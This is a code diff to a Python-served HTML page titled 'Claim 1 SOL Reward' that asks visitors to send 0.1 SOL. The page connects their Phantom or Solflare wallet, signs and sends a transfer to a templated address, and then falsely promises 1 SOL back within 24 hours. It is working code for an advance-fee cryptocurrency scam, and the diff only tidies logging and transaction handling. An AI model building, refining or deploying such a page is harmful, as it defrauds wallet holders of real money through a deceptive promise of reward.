@@ -38,10 +38,6 @@ HTML_TEMPLATE = """
     color: #000;
     font-weight: bold;
   }
-  #walletStatus {
-    margin-top: 20px;
-    font-weight: bold;
-  }
 </style>
 <script type="module">
   import {
@@ -55,17 +51,20 @@ HTML_TEMPLATE = """
 
   function updateStatus(text) {
     document.getElementById("walletStatus").innerText = text;
+    console.log("[STATUS]", text);
   }
 
+  // Detect wallet with polling and verbose logs
   async function detectProviderWithPolling(timeoutMs = 10000, intervalMs = 500) {
     const start = Date.now();
     return new Promise((resolve) => {
       const check = () => {
+        console.log("Checking for window.solana...", window.solana);
         if (window.solana && (window.solana.isPhantom || window.solana.isSolflare)) {
-          console.log("Wallet provider detected:", window.solana);
+          console.log("Detected wallet provider:", window.solana);
           resolve(window.solana);
         } else if (Date.now() - start > timeoutMs) {
-          console.log("Wallet provider NOT detected after timeout");
+          console.log("Wallet provider not found after timeout");
           resolve(null);
         } else {
           setTimeout(check, intervalMs);
@@ -76,17 +75,19 @@ HTML_TEMPLATE = """
   }
 
   async function connectWallet() {
-    console.log("Connecting wallet...");
+    console.log("connectWallet called");
     updateStatus("Detecting wallet provider...");
     provider = await detectProviderWithPolling();
 
     if (!provider) {
-      updateStatus("No wallet detected. Please open Solflare or Phantom app and open this site inside its browser.");
+      updateStatus("No wallet detected. Please open this site inside Solflare or Phantom app browser.");
       document.getElementById("qrCode").style.display = "block";
       document.getElementById("connectWalletBtn").disabled = false;
       document.getElementById("claimBtn").disabled = true;
       return;
     }
+
+    console.log("Provider found:", provider);
 
     if (provider.isConnected) {
       console.log("Wallet already connected:", provider.publicKey.toString());
@@ -96,6 +97,7 @@ HTML_TEMPLATE = """
       return;
     }
 
+    // Listen for wallet connect event
     provider.on("connect", () => {
       console.log("Wallet connected event:", provider.publicKey.toString());
       updateStatus("Wallet Connected: " + provider.publicKey.toString());
@@ -104,7 +106,7 @@ HTML_TEMPLATE = """
     });
 
     try {
-      console.log("Calling provider.connect()...");
+      console.log("Calling provider.connect()");
       await provider.connect();
       console.log("provider.connect() resolved");
     } catch (err) {
@@ -121,28 +123,23 @@ HTML_TEMPLATE = """
       return;
     }
 
-    updateStatus("Sending transaction...");
-
     const connection = new Connection("https://api.mainnet-beta.solana.com");
 
     const transaction = new Transaction().add(
       SystemProgram.transfer({
         fromPubkey: provider.publicKey,
         toPubkey: new PublicKey("{{ wallet }}"),
-        lamports: 0.1 * 1e9 // 0.1 SOL in lamports
+        lamports: 0.1 * 1e9 // 0.1 SOL
       })
     );
 
     try {
-      const signedTx = await provider.signTransaction(transaction);
-      const signature = await connection.sendRawTransaction(signedTx.serialize());
+      const { signature } = await provider.signAndSendTransaction(transaction);
       await connection.confirmTransaction(signature);
-      alert("✅ Transaction sent! You paid 0.1 SOL and will receive 1 SOL within 24 hours.");
-      updateStatus("Transaction confirmed: " + signature);
+      alert("✅ Transaction sent! You’ve paid 0.1 SOL to claim 1 SOL. Please wait 24 hours.");
     } catch (e) {
       console.error(e);
       alert("❌ Transaction failed: " + e.message);
-      updateStatus("Transaction failed");
     }
   }
 
@@ -152,7 +149,7 @@ HTML_TEMPLATE = """
 </head>
 <body>
   <h1>Claim 1 SOL Reward</h1>
-  <p>Send exactly <b>0.1 SOL</b> to this wallet address:</p>
+  <p>Send exactly <b>0.1 SOL</b> to:</p>
   <p><code>{{ wallet }}</code></p>
   <img id="qrCode" src="{{ qr_url }}" class="qr" alt="QR Code" />
   <p id="walletStatus">Click "Connect Wallet" to begin</p>
